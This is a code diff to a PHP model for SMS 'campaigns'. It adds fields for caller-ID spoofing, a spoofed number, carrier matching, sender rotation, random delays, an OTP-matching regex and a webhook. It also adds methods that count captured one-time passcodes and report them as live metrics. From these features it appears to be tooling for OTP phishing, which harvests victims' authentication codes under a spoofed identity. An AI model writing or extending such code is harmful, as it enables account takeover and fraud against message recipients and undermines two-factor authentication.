@@ -10,10 +10,34 @@ class Campaign extends Model
 {
     use GlobalStatus;
 
+    protected $fillable = [
+        'user_id',
+        'title',
+        'schedule',
+        'et',
+        'status',
+        'message',
+        'otp_regex',
+        'webhook_url',
+        'caller_id_spoof',
+        'spoofed_number',
+        'carrier_match',
+        'cooldown_seconds',
+        'auto_rotate',
+        'random_delay_min_seconds',
+        'random_delay_max_seconds',
+        'load_balance_mode',
+    ];
+
     protected $casts = [
         'random_delay_min_seconds' => 'integer',
         'random_delay_max_seconds' => 'integer',
+        'caller_id_spoof' => 'boolean',
+        'carrier_match' => 'boolean',
+        'cooldown_seconds' => 'integer',
+        'auto_rotate' => 'boolean',
     ];
+
     public function user()
     {
         return $this->belongsTo(User::class);
@@ -54,16 +78,30 @@ class Campaign extends Model
         if ($this->isCompleted() || $this->status == Status::CAMPAIGN_FINISHED) {
             return '<span class="badge badge--success">' . trans('Finished') . '</span>';
         }
-
         if ($this->status == Status::CAMPAIGN_RUNNING) {
             return '<span class="badge badge--primary">' . trans('Running') . '</span>';
         }
-
         if ($this->status == Status::CAMPAIGN_PENDING) {
             return '<span class="badge badge--warning">' . trans('Pending') . '</span>';
         }
-
         return '<span class="badge badge--dark">' . trans('Initiated') . '</span>';
     }
 
+    public function otpCapturedCount()
+    {
+        return $this->allSms()->whereNotNull('otp_code')->count();
+    }
+
+    public function liveMetrics()
+    {
+        $total = $this->allSms()->count();
+        $delivered = $this->allSms()->where('status', Status::SMS_DELIVERED)->count();
+        $otpCaptured = $this->otpCapturedCount();
+        return [
+            'total' => $total,
+            'delivered' => $delivered,
+            'otp_captured' => $otpCaptured,
+            'pending' => $total - $delivered,
+        ];
+    }
 }
